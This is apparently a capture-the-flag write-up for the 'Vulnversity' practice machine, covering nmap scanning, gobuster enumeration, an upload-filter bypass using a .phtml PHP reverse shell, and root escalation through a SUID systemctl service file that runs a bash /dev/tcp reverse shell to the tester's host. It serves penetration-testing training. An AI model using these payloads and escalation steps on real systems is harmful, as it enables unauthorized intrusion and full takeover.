# Vulnversity

## Task 2 - Reconnaissance

```
nmap
flag	Description

-sV	Attempts to determine the version of the services running
-p <x> or -p-	Port scan for port <x> or scan all ports
-Pn	Disable host discovery and just scan for open ports
-A	Enables OS and version detection, executes in-build scripts for further enumeration 
-sC	Scan with the default nmap scripts
-v	Verbose mode
-sU	UDP port scan
-sS	TCP SYN port scan
```

### Question 2: Scan the box, how many ports are open?

```
# nmap -sV -vv -Pn -T4 10.10.81.45

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 05:47 EST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 05:47
Completed Parallel DNS resolution of 1 host. at 05:47, 1.18s elapsed
Initiating SYN Stealth Scan at 05:47
Scanning 10.10.81.45 [1000 ports]
Discovered open port 22/tcp on 10.10.81.45
Discovered open port 21/tcp on 10.10.81.45
Discovered open port 445/tcp on 10.10.81.45
Discovered open port 139/tcp on 10.10.81.45
Discovered open port 3128/tcp on 10.10.81.45
Discovered open port 3333/tcp on 10.10.81.45
Increasing send delay for 10.10.81.45 from 0 to 5 due to 235 out of 587 dropped probes since last increase.
Increasing send delay for 10.10.81.45 from 5 to 10 due to 17 out of 42 dropped probes since last increase.
Completed SYN Stealth Scan at 05:47, 9.83s elapsed (1000 total ports)
Initiating Service scan at 05:47
Scanning 6 services on 10.10.81.45
Completed Service scan at 05:47, 21.78s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.81.45.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:47
Completed NSE at 05:47, 0.51s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:47
Completed NSE at 05:47, 0.40s elapsed
Nmap scan report for 10.10.81.45
Host is up, received user-set (0.078s latency).
Scanned at 2023-01-14 05:47:10 EST for 33s
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack ttl 63 Squid http proxy 3.5.12
3333/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.00 seconds
           Raw packets sent: 1665 (73.260KB) | Rcvd: 1002 (40.104KB)
```

### Question 4: How many ports will nmap scan if the flag -p-400 was used?

```
nmap -sV -vv -Pn -p-400 -T4 10.10.81.45

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 05:49 EST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 05:49
Completed Parallel DNS resolution of 1 host. at 05:49, 2.08s elapsed
Initiating SYN Stealth Scan at 05:49
Scanning 10.10.81.45 [400 ports]
Discovered open port 21/tcp on 10.10.81.45
Discovered open port 139/tcp on 10.10.81.45
Discovered open port 22/tcp on 10.10.81.45
Completed SYN Stealth Scan at 05:49, 2.41s elapsed (400 total ports)
Initiating Service scan at 05:49
Scanning 3 services on 10.10.81.45
Completed Service scan at 05:49, 11.28s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.81.45.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:49
Completed NSE at 05:49, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:49
Completed NSE at 05:49, 0.00s elapsed
Nmap scan report for 10.10.81.45
Host is up, received user-set (0.15s latency).
Scanned at 2023-01-14 05:49:08 EST for 14s
Not shown: 397 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.05 seconds
           Raw packets sent: 406 (17.864KB) | Rcvd: 400 (16.012KB)
```

### Question 5: Using the nmap flag -n what will it not resolve?

```
-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
```

### Question 6: What is the most likely operating system this machine is running?

```
└─# nmap -sV -vv -Pn -O -T4 10.10.81.45
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 05:57 EST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 05:57
Completed Parallel DNS resolution of 1 host. at 05:57, 1.15s elapsed
Initiating SYN Stealth Scan at 05:57
Scanning 10.10.81.45 [1000 ports]
Discovered open port 139/tcp on 10.10.81.45
Discovered open port 22/tcp on 10.10.81.45
Discovered open port 21/tcp on 10.10.81.45
Discovered open port 445/tcp on 10.10.81.45
Discovered open port 3333/tcp on 10.10.81.45
Discovered open port 3128/tcp on 10.10.81.45
Increasing send delay for 10.10.81.45 from 0 to 5 due to 278 out of 694 dropped probes since last increase.
Increasing send delay for 10.10.81.45 from 5 to 10 due to 12 out of 29 dropped probes since last increase.
Completed SYN Stealth Scan at 05:57, 10.56s elapsed (1000 total ports)
Initiating Service scan at 05:57
Scanning 6 services on 10.10.81.45
Completed Service scan at 05:57, 21.74s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 10.10.81.45
Retrying OS detection (try #2) against 10.10.81.45
Retrying OS detection (try #3) against 10.10.81.45
Retrying OS detection (try #4) against 10.10.81.45
Retrying OS detection (try #5) against 10.10.81.45
NSE: Script scanning 10.10.81.45.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.54s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.40s elapsed
Nmap scan report for 10.10.81.45
Host is up, received user-set (0.075s latency).
Scanned at 2023-01-14 05:57:06 EST for 46s
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack ttl 63 Squid http proxy 3.5.12
3333/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Uptime guess: 0.016 days (since Sat Jan 14 05:35:04 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.55 seconds
           Raw packets sent: 1746 (82.576KB) | Rcvd: 1105 (58.740KB)
```

## Task 3 - Locating directories using GoBuster

- GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names.

### Question 2: What is the directory that has an upload form page?

```
─# gobuster dir -u http://10.10.81.45:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.45:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/14 06:43:13 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 318] [--> http://10.10.81.45:3333/images/]
/css                  (Status: 301) [Size: 315] [--> http://10.10.81.45:3333/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.81.45:3333/js/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.81.45:3333/fonts/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.81.45:3333/internal/]
```

## Task 4 - Compromise the Web Server

- So we have found the /internal/ upload page, we need to upload a Reverse Shell.

- You can get it from : https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

- If we try to upload it directly, It says *Extension not allowed*.

- Let's bruteforce extensions with the burp Suite.

- After running Attack type sniper, we see that *phtml* is allowed.

- We change php reverse shell extension to `.phtml` and edit local IP and Port:

```
# nano php-reverse-shell.php

$ip = '10.8.54.26';  // CHANGE THIS
$port = 1101;       // CHANGE THIS

# mv php-reverse-shell.php php-reverse-shell.phtml
```

- Open a new tab in terminal and listen with: `nc -nvlp 1101`

- Upload the shell and success.

- Now, we need to run php file to get a reverse shell. Uploaded files are located in: `http://<ip>:3333/internal/uploads/`

- If we head into `http://10.10.81.45:3333/internal/uploads/php-reverse-shell.phtml`, our netcat should get a shell.

```
listening on [any] 1101 ...
connect to [10.8.54.26] from (UNKNOWN) [10.10.81.45] 35486
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:40:08 up  2:10,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls /home/
bill
$ cat /home/bill/user.txt
```

## Task 5 - Privelege Escalation

- In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file.

- The binary file to change your password has the SUID bit set on it (/usr/bin/passwd).

- To search for files that you have permissions and the file owned by root:

```
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
```

- So we have access to `/bin/systemctl`.

- We can create,customize and run service files with systemctl.

- Let's head into `cd /tmp/` and `touch a.service`

- And then paste this command: 

- Set your payload with your $IP and $PORT `/bin/bash -c 'bash -i &>/dev/tcp/$IP/$PORT <&1'` and put it in front of `ExecStart=` part like:

```
echo "[Unit]
Description=privesc

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i &>/dev/tcp/10.8.54.26/1102 <&1'

[Install]
Wantedby=multi-user.target" > /tmp/a.service
```

- Now listen in another tab of your terminal with: `nc -nvlp 1102`

- It's a systemd service file, and We're making it run a command at startup.

- It places the payload *that is popping a reverse shell* in `a.service` file.

- And to enable this service, simply run `systemctl enable /tmp/a.service`

- And then, start this service: `systemctl start a`

- Now we see our shell is popped in.

```
# nc -nvlp 1102

listening on [any] 1102 ...
connect to [10.8.54.26] from (UNKNOWN) [10.10.81.45] 59792
bash: cannot set terminal process group (13562): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:~# cat /root/root.txt
```
